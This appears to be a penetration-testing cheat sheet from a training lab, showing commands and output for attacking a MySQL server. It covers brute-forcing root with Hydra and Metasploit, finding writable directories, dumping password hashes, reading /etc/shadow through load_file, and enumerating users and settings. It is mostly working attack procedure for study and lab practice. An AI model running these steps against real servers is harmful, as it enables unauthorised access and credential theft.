# MySQL

## Check for root Empty Password

Usefull if the mysql client is not installed

```bash
root@attackdefense:~# nmap $target --script mysql-empty-password
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 13:04 UTC
Nmap scan report for target-1 (192.214.78.3)
Host is up (0.000012s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password:
|_  root account has empty password
MAC Address: 02:42:C0:D6:4E:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

## Brute Force Login

### Hydra
```bash
root@attackdefense:~# hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $target mysql
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-17 13:44:38
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task
[DATA] attacking mysql://192.60.131.3:3306/
[3306][mysql] host: 192.60.131.3   login: root   password: catalina
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-17 13:45:32
root@attackdefense:~#
```

### Metasploit

```bash
msf5 > use auxiliary/scanner/mysql/mysql_login

msf5 auxiliary(scanner/mysql/mysql_login) > options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.60.131.3
RHOSTS => 192.60.131.3

msf5 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

msf5 auxiliary(scanner/mysql/mysql_login) > set VERBOSE false
VERBOSE => false

msf5 auxiliary(scanner/mysql/mysql_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true

msf5 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
USERNAME => root

msf5 auxiliary(scanner/mysql/mysql_login) > exploit

[+] 192.60.131.3:3306     - 192.60.131.3:3306 - Success: 'root:catalina'
[*] 192.60.131.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Authenticated

Most of these are probably easier to run from the mysql client.

### Find Writable Dirs

```bash
msf5 > use auxiliary/scanner/mysql/mysql_writable_dirs

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > options

Module options (auxiliary/scanner/mysql/mysql_writable_dirs):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DIR_LIST                    yes       List of directories to test
   FILE_NAME  RamXQyeB         yes       Name of file to write
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      3306             yes       The target port (TCP)
   THREADS    1                yes       The number of concurrent threads
   USERNAME   root             yes       The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set RHOSTS 192.214.78.3
RHOSTS => 192.214.78.3

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
DIR_LIST => /usr/share/metasploit-framework/data/wordlists/directory.txt

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set VERBOSE false
VERBOSE => false

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > exploit

[!] 192.214.78.3:3306     - For every writable directory found, a file called RamXQyeB with the text test will be written to the directory.
[*] 192.214.78.3:3306     - Login...
[*] 192.214.78.3:3306     - Checking /tmp...
[+] 192.214.78.3:3306     - /tmp is writeable
[*] 192.214.78.3:3306     - Checking /etc/passwd...
[!] 192.214.78.3:3306     - Can't create/write to file '/etc/passwd/RamXQyeB' (Errcode: 20)
[*] 192.214.78.3:3306     - Checking /etc/shadow...
[!] 192.214.78.3:3306     - Can't create/write to file '/etc/shadow/RamXQyeB' (Errcode: 20)
[*] 192.214.78.3:3306     - Checking /root...
[+] 192.214.78.3:3306     - /root is writeable
[*] 192.214.78.3:3306     - Checking /home...
[!] 192.214.78.3:3306     - Can't create/write to file '/home/RamXQyeB' (Errcode: 13)
[*] 192.214.78.3:3306     - Checking /etc...

...

[!] 192.214.78.3:3306     - Can't create/write to file '/Admin/RamXQyeB' (Errcode: 2)
[*] 192.214.78.3:3306     - Checking /etc...
[!] 192.214.78.3:3306     - Can't create/write to file '/etc/RamXQyeB' (Errcode: 13)
[*] 192.214.78.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Dump Hashes From MySQL

```bash
root@attackdefense:~# nmap $target --script mysql-dump-hashes --script-args="username='root',password=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 13:13 UTC
Nmap scan report for target-1 (192.214.78.3)
Host is up (0.000013s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-dump-hashes:
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
MAC Address: 02:42:C0:D6:4E:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

```bash
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > use auxiliary/scanner/mysql/mysql_hashdump

msf5 auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target address range or CIDR identifier
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads
   USERNAME                   no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 192.214.78.3
RHOSTS => 192.214.78.3

msf5 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root

msf5 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD ""
PASSWORD =>

msf5 auxiliary(scanner/mysql/mysql_hashdump) > exploit

[+] 192.214.78.3:3306     - Saving HashString as Loot: root:
[+] 192.214.78.3:3306     - Saving HashString as Loot: root:
[+] 192.214.78.3:3306     - Saving HashString as Loot: root:
[+] 192.214.78.3:3306     - Saving HashString as Loot: root:
[+] 192.214.78.3:3306     - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.214.78.3:3306     - Saving HashString as Loot: root:
[+] 192.214.78.3:3306     - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.214.78.3:3306     - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.214.78.3:3306     - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.214.78.3:3306     - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.214.78.3:3306     - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.214.78.3:3306     - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
[*] 192.214.78.3:3306     - Scanned 1 of 1 hosts (100% complete)
```


### Use MySQL to Read Files

```bash
MySQL [(none)]> select load_file("/etc/shadow");
+-----------------------------------------------------+
| load_file("/etc/shadow")
+-----------------------------------------------------+
| root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
daemon:*:17850:0:99999:7:::
bin:*:17850:0:99999:7:::
sys:*:17850:0:99999:7:::
sync:*:17850:0:99999:7:::
games:*:17850:0:99999:7:::
man:*:17850:0:99999:7:::
lp:*:17850:0:99999:7:::
mail:*:17850:0:99999:7:::
news:*:17850:0:99999:7:::
uucp:*:17850:0:99999:7:::
proxy:*:17850:0:99999:7:::
www-data:*:17850:0:99999:7:::
backup:*:17850:0:99999:7:::
list:*:17850:0:99999:7:::
irc:*:17850:0:99999:7:::
gnats:*:17850:0:99999:7:::
nobody:*:17850:0:99999:7:::
libuuid:!:17850:0:99999:7:::
syslog:*:17850:0:99999:7:::
mysql:!:17857:0:99999:7:::
dbadmin:$6$vZ3Fv3x6$qdB/lOAC1EtlKEC2H8h5f7t33j65WDbHHV50jloFkxFBeQC8QkdbQKpHEp/BkVMQD2C2AFPkYW3.W7jMlMbl5.:17861:0:99999:7:::
 |
+-----------------------------------------------------+
1 row in set (0.001 sec)
```


### List Users
```bash
root@attackdefense:~# nmap $target --script mysql-users --script-args="mysqluser='root',mysqlpass=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 13:06 UTC
Nmap scan report for target-1 (192.214.78.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-users:
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra
MAC Address: 02:42:C0:D6:4E:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

### List Variables

```bash
root@attackdefense:~# nmap $target --script mysql-variables --script-args="mysqluser='root',mysqlpass=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 13:07 UTC
Nmap scan report for target-1 (192.214.78.3)
Host is up (0.000013s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-variables:
|   auto_increment_increment: 1
|   auto_increment_offset: 1
|   autocommit: ON
|   automatic_sp_privileges: ON
|   back_log: 50
|   basedir: /usr
|   big_tables: OFF
|   binlog_cache_size: 32768
|   binlog_direct_non_transactional_updates: OFF
|   binlog_format: STATEMENT
|   binlog_stmt_cache_size: 32768
|   bulk_insert_buffer_size: 8388608
|   character_set_client: latin1
...
|_  warning_count: 0
MAC Address: 02:42:C0:D6:4E:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
```

### Audit

```bash
root@attackdefense:~# nmap $target --script mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 13:10 UTC
Nmap scan report for target-1 (192.214.78.3)
Host is up (0.000012s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-audit:
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint
MAC Address: 02:42:C0:D6:4E:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```